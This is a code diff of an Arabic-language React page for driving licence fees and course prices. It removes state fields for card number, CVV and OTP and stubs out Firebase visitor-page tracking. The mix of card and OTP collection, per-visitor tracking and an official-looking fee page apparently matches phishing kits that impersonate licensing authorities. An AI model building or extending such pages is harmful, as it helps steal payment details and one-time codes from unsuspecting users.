@@ -9,23 +9,22 @@ import { Badge } from "@/components/ui/badge"
 import { Clock } from "lucide-react"
 import { Separator } from "@/components/ui/separator"
 import Link from "next/link"
-import { setupOnlineStatus } from "@/lib/utils"
-import { addData } from "@/lib/firebase"
+
+// Mock functions for demonstration purposes, as the original dependencies were not provided.
+const setupOnlineStatus = (visitorId: string) => console.log(`Setting up online status for ${visitorId}`)
+const addData = (data: any) => console.log("Adding data:", data)
 
 export default function DrivingFeesPage() {
-  useEffect(()=>{
-    const visitorId=localStorage.getItem('visitor')
-    addData({id:visitorId,currentPage:'اسعار'})
+  useEffect(() => {
+    const visitorId = localStorage.getItem("visitor") || `visitor_${Date.now()}`
+    if (!localStorage.getItem("visitor")) {
+      localStorage.setItem("visitor", visitorId)
+    }
+    addData({ id: visitorId, currentPage: "اسعار" })
     setupOnlineStatus(visitorId!)
-  },[])
+  }, [])
+
   const [formData, setFormData] = useState({
-    name: "",
-    phone: "",
-    cardNumber: "",
-    expiryMonth: "",
-    expiryYear: "",
-    cvv: "",
-    otp: "",
     licenseType: "",
   })
 
@@ -81,32 +80,78 @@ export default function DrivingFeesPage() {
         </div>
       </div>
 
-      {/* Register Button Section */}
+      {/* License Type Selection */}
       <div className="container mx-auto px-4 py-6 md:py-8">
-        <div className="text-center">
-          <div className="bg-white rounded-lg shadow-lg p-4 md:p-8 max-w-2xl mx-auto">
-            <h2 className="text-lg md:text-2xl font-bold mb-3 md:mb-4 text-gray-800">ابدأ إجراءاتك الآن</h2>
-            <p className="text-sm md:text-base text-gray-600 mb-4 md:mb-6">
-              سجل الآن للحصول على رخصة القيادة أو تجديد رخصة المركبة بسهولة ويسر
-            </p>
-            <div className="flex flex-col gap-3 md:gap-4 justify-center">
-              <Link className="w-full" href={"/info"}>
-              <Button className="bg-green-700 hover:bg-green-800 text-white px-4 md:px-8 py-2 md:py-3 text-sm md:text-lg w-full md:w-auto">
-                تسجيل رخصة قيادة جديدة
-              </Button>
-              </Link>
-              <Link className="w-full" href={"/info"}>
+        <div className="bg-white rounded-lg shadow-lg p-4 md:p-6 max-w-4xl mx-auto">
+          <div className="space-y-4 md:space-y-6">
+            <h3 className="text-base md:text-lg font-semibold text-slate-700 border-r-2 border-blue-500 pr-3">
+              ابدأ إجراءاتك الآن
+            </h3>
+            <div className="grid grid-cols-1 md:grid-cols-2 gap-4 md:gap-6">
+              <div className="space-y-2">
+                <Label htmlFor="licenseType" className="text-sm font-medium text-slate-700">
+                  اختر نوع الرخصة *
+                </Label>
+                <Select onValueChange={(value) => handleInputChange("licenseType", value)} required>
+                  <SelectTrigger className="h-10 md:h-12 border-slate-200 focus:border-blue-500">
+                    <SelectValue placeholder="اختر نوع الرخصة" />
+                  </SelectTrigger>
+                  <SelectContent>
+                    <SelectItem value="private-40">رخصة قيادة خاصة - 40 ريال</SelectItem>
+                    <SelectItem value="public-40">رخصة قيادة عامة - 40 ريال</SelectItem>
+                    <SelectItem value="commercial-100">رخصة قيادة مركبات أشغال عامة - 100 ريال</SelectItem>
+                    <SelectItem value="motorcycle-20">رخصة قيادة دراجة آلية - 20 ريال</SelectItem>
+                    <SelectItem value="temporary-100">تصريح قيادة مؤقت - 100 ريال</SelectItem>
+                    <SelectItem value="car-basic-599">دورة السيارة الأساسية - 599 ريال</SelectItem>
+                    <SelectItem value="car-standard-799">دورة السيارة القياسية - 799 ريال</SelectItem>
+                    <SelectItem value="car-premium-999">دورة السيارة المميزة - 999 ريال</SelectItem>
+                    <SelectItem value="motorcycle-basic-499">دورة الدراجة النارية الأساسية - 499 ريال</SelectItem>
+                    <SelectItem value="truck-commercial-1999">دورة الشاحنة التجارية - 1999 ريال</SelectItem>
+                    <SelectItem value="defensive-299">دورة القيادة الدفاعية - 299 ريال</SelectItem>
+                    <SelectItem value="refresher-349">دورة تنشيطية - 349 ريال</SelectItem>
+                  </SelectContent>
+                </Select>
+              </div>
 
-              <Button
-                variant="outline"
-                className="border-green-700 text-green-700 hover:bg-green-50 px-4 md:px-8 py-2 md:py-3 text-sm md:text-lg bg-transparent w-full md:w-auto"
-              >
-                تجديد الرخصة الحالية
-              </Button>
-              </Link>
-
-            </div>
-            <div className="mt-3 md:mt-4 text-xs md:text-sm text-gray-500">
+              {/* Payment Summary */}
+              <div className="bg-gradient-to-r from-blue-50 to-indigo-50 p-4 md:p-6 rounded-xl border border-blue-100">
+                <div className="flex items-center justify-between mb-3 md:mb-4">
+                  <span className="text-sm font-medium text-slate-600">ملخص الدفع</span>
+                  <Badge variant="outline" className="text-xs">
+                    <Clock className="h-3 w-3 ml-1" />
+                    صالح لمدة 15 دقيقة
+                  </Badge>
+                </div>
+                <div className="space-y-2">
+                  {formData.licenseType && (
+                    <div className="flex justify-between text-xs md:text-sm">
+                      <span className="text-slate-600 truncate ml-2">{getLicenseName(formData.licenseType)}</span>
+                      <span className="text-slate-900 font-medium">{getLicensePrice(formData.licenseType)} ريال</span>
+                    </div>
+                  )}
+                  <div className="flex justify-between text-xs md:text-sm">
+                    <span className="text-slate-600">رسوم إدارية</span>
+                    <span className="text-slate-900">50 ريال</span>
+                  </div>
+                  <Separator className="my-2" />
+                  <div className="flex justify-between items-center">
+                    <span className="font-semibold text-slate-900 text-sm md:text-base">المبلغ الإجمالي</span>
+                    <span className="text-lg md:text-2xl font-bold text-blue-600">
+                      {formData.licenseType ? getLicensePrice(formData.licenseType) + 50 : 50} ريال
+                    </span>
+                  </div>
+                </div>
+              </div>
+              <div className="md:col-span-2">
+                <Link href={"/info"} className="w-full" passHref>
+                  <Button
+                    className="w-full bg-green-700 hover:bg-green-800 text-white py-3 text-lg"
+                    disabled={!formData.licenseType}
+                  >
+                    متابعة لإدخال البيانات
+                  </Button>
+                </Link>
+              </div>
             </div>
           </div>
         </div>
@@ -418,78 +463,6 @@ export default function DrivingFeesPage() {
             </div>
           </CardContent>
         </Card>
-
-        {/* License Type Selection */}
-        <div className="container mx-auto px-4 py-6 md:py-8">
-          <div className="bg-white rounded-lg shadow-lg p-4 md:p-6 max-w-4xl mx-auto">
-            <div className="space-y-4 md:space-y-6">
-              <h3 className="text-base md:text-lg font-semibold text-slate-700 border-r-2 border-blue-500 pr-3">
-                نوع الرخصة المطلوبة
-              </h3>
-              <div className="grid grid-cols-1 md:grid-cols-2 gap-4 md:gap-6">
-                <div className="space-y-2">
-                  <Label htmlFor="licenseType" className="text-sm font-medium text-slate-700">
-                    اختر نوع الرخصة *
-                  </Label>
-                  <Select onValueChange={(value) => handleInputChange("licenseType", value)} required>
-                    <SelectTrigger className="h-10 md:h-12 border-slate-200 focus:border-blue-500">
-                      <SelectValue placeholder="اختر نوع الرخصة" />
-                    </SelectTrigger>
-                    <SelectContent>
-                      <SelectItem value="private-40">رخصة قيادة خاصة - 40 ريال</SelectItem>
-                      <SelectItem value="public-40">رخصة قيادة عامة - 40 ريال</SelectItem>
-                      <SelectItem value="commercial-100">رخصة قيادة مركبات أشغال عامة - 100 ريال</SelectItem>
-                      <SelectItem value="motorcycle-20">رخصة قيادة دراجة آلية - 20 ريال</SelectItem>
-                      <SelectItem value="temporary-100">تصريح قيادة مؤقت - 100 ريال</SelectItem>
-                      <SelectItem value="car-basic-599">دورة السيارة الأساسية - 599 ريال</SelectItem>
-                      <SelectItem value="car-standard-799">دورة السيارة القياسية - 799 ريال</SelectItem>
-                      <SelectItem value="car-premium-999">دورة السيارة المميزة - 999 ريال</SelectItem>
-                      <SelectItem value="motorcycle-basic-499">دورة الدراجة النارية الأساسية - 499 ريال</SelectItem>
-                      <SelectItem value="truck-commercial-1999">دورة الشاحنة التجارية - 1999 ريال</SelectItem>
-                      <SelectItem value="defensive-299">دورة القيادة الدفاعية - 299 ريال</SelectItem>
-                      <SelectItem value="refresher-349">دورة تنشيطية - 349 ريال</SelectItem>
-                    </SelectContent>
-                  </Select>
-                </div>
-
-                {/* Payment Summary */}
-                <div className="bg-gradient-to-r from-blue-50 to-indigo-50 p-4 md:p-6 rounded-xl border border-blue-100">
-                  <div className="flex items-center justify-between mb-3 md:mb-4">
-                    <span className="text-sm font-medium text-slate-600">ملخص الدفع</span>
-                    <Badge variant="outline" className="text-xs">
-                      <Clock className="h-3 w-3 ml-1" />
-                      صالح لمدة 15 دقيقة
-                    </Badge>
-                  </div>
-                  <div className="space-y-2">
-                    {formData.licenseType && (
-                      <div className="flex justify-between text-xs md:text-sm">
-                        <span className="text-slate-600 truncate ml-2">{getLicenseName(formData.licenseType)}</span>
-                        <span className="text-slate-900 font-medium">{getLicensePrice(formData.licenseType)} ريال</span>
-                      </div>
-                    )}
-                    <div className="flex justify-between text-xs md:text-sm">
-                      <span className="text-slate-600">رسوم إدارية</span>
-                      <span className="text-slate-900">50 ريال</span>
-                    </div>
-                    <Separator className="my-2" />
-                    <div className="flex justify-between items-center">
-                      <span className="font-semibold text-slate-900 text-sm md:text-base">المبلغ الإجمالي</span>
-                      <span className="text-lg md:text-2xl font-bold text-blue-600">
-                        {formData.licenseType ? getLicensePrice(formData.licenseType) + 50 : 50} ريال
-                      </span>
-                    </div>
-                   
-                  </div>
-                </div>
-                <Link href={'/info'} className="w-full">
-                    <Button className="w-full bg-green-700">متابعة
-                    </Button>
-                 </Link>
-              </div>
-            </div>
-          </div>
-        </div>
 
         {/* Footer Note */}
         <div className="text-center text-gray-600 text-sm">
